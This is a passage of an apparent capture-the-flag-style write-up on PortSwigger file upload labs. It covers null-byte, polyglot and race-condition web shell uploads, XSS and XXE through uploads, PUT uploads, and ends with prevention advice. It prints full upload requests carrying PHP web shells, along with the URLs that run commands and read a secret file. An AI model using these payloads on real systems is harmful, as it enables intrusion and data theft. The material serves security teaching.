Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAo8vATWUNXNMvMhB
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=eAfIPJECPfvaoUFvXqUvytzbU5Ce0Iup
Content-Length: 451

------WebKitFormBoundaryAo8vATWUNXNMvMhB
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.png"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryAo8vATWUNXNMvMhB
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryAo8vATWUNXNMvMhB
Content-Disposition: form-data; name="csrf"

mAfknBizV9vvO47On9cdhgc1lKQQeZWv
------WebKitFormBoundaryAo8vATWUNXNMvMhB--

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 13:24:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Their response says the file `avatars/exploit.php` is uploaded instead of `exploit.php%00.jpg` which means the Null byte worked and we successfully bypassed the blacklist mechanism. Now the webshell is uploaded Send the GET request to the following URL to exfiltrate the content of the `/home/carlos/secret` file.

```
https://0ad90038033d46d8819c482600d8005f.web-security-academy.net/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret
```


### File Content Validation

Instead of blindly trusting the `Content-Type` header provided in a request, secure servers employ a cautious approach by verifying the actual content of uploaded files to ensure they match the expected file type.

When dealing with image uploads, servers can perform additional checks on intrinsic file properties, such as its dimensions. By examining these properties, the server can detect inconsistencies. For example, if a file claimed to be an image lacks any dimensions, it is clear that it cannot be a valid image, leading to the rejection of the upload.

Moreover, certain file types have distinct patterns in their header or footer, which serve as unique fingerprints or signatures. These specific byte sequences, often referred to as Magic Bytes or signature characters, allow servers to determine if the file content corresponds to the expected file type. For instance, JPEG files always start with the bytes `FF D8 FF`. Each file type has its own set of magic bytes, and you can learn more about them in the [Wikipedia Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) reference.

While this approach greatly improves file type validation, it is not completely immune to exploitation. Advanced tools like `ExifTool` can be used to create polyglot (a type of file that is valid and interpretable by multiple file formats or programming languages) JPEG files that contain malicious code within their metadata, evading detection by leveraging the intricacies of file format specifications.

Attackers employ these techniques to bypass security measures and execute PHP web shell code. One approach involves adding image magic bytes at the beginning of a PHP web shell file, disguising it as an image file. Another method involves utilizing tools like `ExifTool` to embed PHP web shell code within the metadata of an image file. This allows the attacker to upload the file with a PHP file extension while still executing the malicious code. These tactics enable attackers to evade detection and exploit vulnerabilities in web applications.

### LAB #6: Remote Code Execution via polyglot web shell upload

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

**Objective**

Upload a polyglot image file that contains the PHP web shell to get RCE, and use that to exfiltrate the content of the `/home/carlos/secret` file.

**Credentials**
```
wiener:peter
```

**Solution**

In this lab after successful login, we can upload an Avatar image from the My Account page. This time if we upload our previous `exploit.php` they give us the following error message.

```
Error: file is not a valid image
Sorry, there was an error uploading your file
```

They are checking if the file is an image file or not if we change the file name to `exploit.jpg.php` they still show us the same error message. That means they are configured more robustly than before, when we upload a simple image file with a PHP extension they accept it. This means they are checking file magic bytes to see if the file is an actual image file or not.

We can exploit it by appending PHP web shell code in the image file and uploading it with the `.php` extension, our request should look like the following.

```
POST /my-account/avatar HTTP/1.1
Host: 0a90005d03ebc50080d6e1da00d30040.web-security-academy.net
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYPRUedjz9k4tV5SJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=9CxLmw2LqOMvHlpCd5ckFWixkYJQw2cf
Content-Length: 971

------WebKitFormBoundaryYPRUedjz9k4tV5SJ
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: application/x-php

PNG

[Image binary data]<?php echo 'START ' . system($_GET["cmd"]) . ' END'; ?>[Image binary data]
------WebKitFormBoundaryYPRUedjz9k4tV5SJ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryYPRUedjz9k4tV5SJ
Content-Disposition: form-data; name="csrf"

HIUVjEcZh6jY37Nt047BkDKEQN7rebDf
------WebKitFormBoundaryYPRUedjz9k4tV5SJ--
```

Send that request, the server will check the request if it has the image magic bytes or not and accepts or deny the request based on that. They accept it in this case because they solely rely on the magic bytes and upload the image file on the server. After the upload visit the file location and send the following GET request in its URL.

```
https://0a90005d03ebc50080d6e1da00d30040.web-security-academy.net/files/avatars/polyglot.php?cmd=id
```

You will see in the response server return the output of the `id` command which means you have a Command Execution on the server. Now change the `id` command with `cat /home/carlos/secret` to exfiltrate the secret data.

### File Upload with Race Conditions

Modern frameworks have implemented strong measures to prevent such attacks. Instead of directly uploading files to their final destination on the filesystem, they take precautions. They upload the files to a temporary and isolated directory with a randomized name to avoid overwriting existing files. In this temporary location, the uploaded files undergo rigorous validation. Only when they are considered safe, and are transferred to their intended destination.

However, there are cases where developers opt to handle file uploads on their own, disregarding the framework's provided mechanisms. This approach is not only challenging to implement correctly but also introduces the possibility of race conditions that can compromise the effectiveness of validation measures, even those that are considered robust.

> **What is a Race Condition?**
>	A **race condition** happens when multiple processes or threads access shared resources at the same time, resulting in unpredictable outcomes due to timing differences. This can lead to bugs, security vulnerabilities, and data inconsistencies.

Certain websites implement a practice where files are uploaded directly to the primary filesystem and subsequently deleted if they do not pass validation. This behavior is commonly observed in websites that employ anti-virus software as a means to detect and mitigate malware. Despite the efforts of attackers to obfuscate the malicious content and evade signature-based detection, it is assumed that the anti-virus software accurately identifies and removes the compromised files. However, even in this scenario, a fleeting time window of mere milliseconds emerges during which the file remains on the server, exposing the possibility of its execution.

These vulnerabilities are typically subtle, making them challenging to identify through `black box` testing unless the relevant source code can be exposed.

Race conditions can also arise in functions that involve file uploading via a URL. In this scenario, the server needs to fetch the file from the internet and create a local copy before performing any validation.

Since the file is loaded using HTTP, developers cannot rely on the built-in security mechanisms of their framework for file validation. Instead, they may resort to manually creating their own processes to temporarily store and validate the file, which may not be as secure as we discussed above.

For example, developers may use a temporary directory with a randomized name to load the file, assuming that it prevents attackers from exploiting race conditions. By not knowing the directory name, attackers would be unable to request the file and trigger its execution. However, if the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it could potentially be guessed through brute force.

To facilitate such attacks, one can attempt to prolong the processing time of the file, thereby increasing the window for brute-forcing the directory name. One approach is to upload a larger file. If the file is processed in chunks, it may be possible to create a malicious file that begins with the payload and is followed by a substantial amount of arbitrary padding bytes.

These attackers exist in the real world and they are indeed very hard to find and exploit but if they were found and exploited there severity is critical.

### LAB #7: Web Shell Upload via Race Condition

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

**Objective**

Upload the PHP web shell and execute it using the race condition to exfiltrate the content of the `/home/carlos/secret` file.

**Source Code**

```php
<?php 

$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];
// temporary move 
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) { 
	echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else { 
	unlink($target_file);
	echo "Sorry, there was an error uploading your file.";
	http_response_code(403);
} 

function checkViruses($fileName) { 
	// checking for viruses 
	... 
} 

function checkFileType($fileName) { 
	$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
	if($imageFileType != "jpg" && $imageFileType != "png") { 
		echo "Sorry, only JPG & PNG files are allowed\n";
		return false;
	} else { 
		return true;
	}
} 
?>
```

**Credentials**
```
wiener:peter
```

**Solution**

This lab has the same robust mechanism as in the last lab in which they are checking the file magic bytes to check if the file is an image file or not. If the file is not an image file they give us the following error message

```
Sorry, only JPG & PNG files are allowed
```

Just like we did in the last lab we can upload php web shell code embedded in the image file that executes on the server. We send the following request to upload our `polyglot.php` that contains the code to exfiltrate data.

```
POST /my-account/avatar HTTP/2
Host: 0a5700ed0422427681f0023400a500c6.web-security-academy.net
Cookie: session=yFdbcw7x9oWw7bLfVbH4fUq0GI8mDsgI
Content-Length: 127323
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHAAA7Gc6mGjgH4Y6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: application/x-php

PNG

[redacted]<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>[Redacted]

------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6
Content-Disposition: form-data; name="csrf"

fLeQX28rivsYgPt7jJUMpTD63knx6XJE
------WebKitFormBoundaryHAAA7Gc6mGjgH4Y6--
```

In the above request, you can see we have the following PHP code in it.

```php
<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

This code directly gets the content of the `/home/carlos/secret` file, but when we upload that it didn't give us any error message they also look like haven't been uploaded on the server because that image URL is not reflected on our profile page.

This makes speculation that the file is uploaded on the server and then deleted after validation. Knowing this we can send the GET request to the following URL.

```
https://0a5700ed0422427681f0023400a500c6.web-security-academy.net/files/avatars/polyglot.php
```

As we know the server is saving the file as its original name so we can guess that file is served with this URL. If we send the GET request to this URL they show us the 404 error which means the file doesn't exist on the server. We can send this request to Burp Intruder and clear all the Positions on the request. Selecting attack type as a sniper and selecting payload type as Null Payload that runs indefinitely.

Start the intruder attack and then upload the `polyglot.php` file on the server as we know this file will be deleted after validation but our intruder attacker still sending requests to the above URL so before the file will be deleted the PHP code executes on the server side.

When you see the file upload is finished pause the intruder attack, and filter the intruder response by length or by status code. You will see the request that has status code 200 that contains the content of the `/home/carlos/secret` file.

## File Uploads without RCE

We talk about scenarios in which we bypass different defensive mechanisms to upload server-side scripts to get remote code execution. Other than this these vulnerabilities also be exploited in other ways.

### Uploading Malicious client-side scripts

While you may not have the ability to execute server-side scripts, there is still a possibility of uploading scripts for client-side attacks. For instance, if you can upload HTML files or `SVG` images, you can leverage `<script>` tags to craft stored XSS payloads.

When the uploaded file is displayed on a page visited by other users, their web browsers will execute the embedded script during the rendering process. It's important to note that such attacks will only be successful if the uploaded file is served from the same origin to which it was uploaded, as it is governed by the same-origin policy restrictions.

### Vulnerabilities in Parsing Process

If the uploaded file appears to be securely stored and served, and all other options have been exhausted, a final approach is to explore vulnerabilities specific to the parsing or processing of various file formats. For instance, if you are aware that the server parses XML-based files like Microsoft Office `.doc` or `.xls` files, there might be an opportunity to launch `XXE` injection attacks through this vector.

### Uploading files using the PUT method

The PUT method is an HTTP request method that is used to upload or replace a resource on a server. It allows clients to send data to the server to update or create a resource at a specific URL.

It is important to mention that certain web servers can be configured to allow PUT requests. In the absence of proper defenses, this can serve as an alternative method for uploading malicious files, even when a specific upload function is not available through the web interface.

```
PUT /images/exploit.php HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-httpd-php 
Content-Length: 49 

<?php echo file_get_contents('/path/to/file'); ?>
```

We can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.

## Prevention

Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:

- **Validate file metadata**: Verify the file type, size, and other metadata provided by the user. Use server-side validation to ensure that only allowed file types are accepted.
- **Restrict file uploads**: Implement restrictions on the maximum file size and limit the allowed file extensions. Consider using a whitelist approach instead of blacklisting specific extensions.
- **Use secure file storage**: Store uploaded files outside the web root directory to prevent direct access and execution. Maintain strict file permissions to limit unauthorized access.
- **Perform server-side validation**: Validate the contents and structure of uploaded files on the server. Use file parsing libraries or built-in functions to check for anomalies or malicious code.
- **Scan for malware**: Employ anti-malware tools or virus scanners to scan uploaded files for potential threats. This helps detect and prevent the upload of malicious files.
- **Use secure coding practices**: Follow secure coding guidelines and best practices to ensure robust input validation and prevent common vulnerabilities like path traversal or remote code execution.
- **Implement secure file naming**: Generate unique and unpredictable filenames for uploaded files to prevent overwriting or direct access to sensitive files.
- **Implement rate limiting and session management**: Enforce rate limits on file uploads to prevent abuse and protect against denial-of-service attacks. Manage user sessions and implement proper authentication and authorization controls.
- **Educate users**: Provide guidance and educate users about safe file upload practices. Encourage them to avoid uploading files of unknown or suspicious origin.
- **Keep software up to date**: Regularly update web server software, frameworks, and libraries to leverage security patches and bug fixes.

By implementing these preventive measures, you can significantly reduce the risk of file upload vulnerabilities and enhance the security of your application.
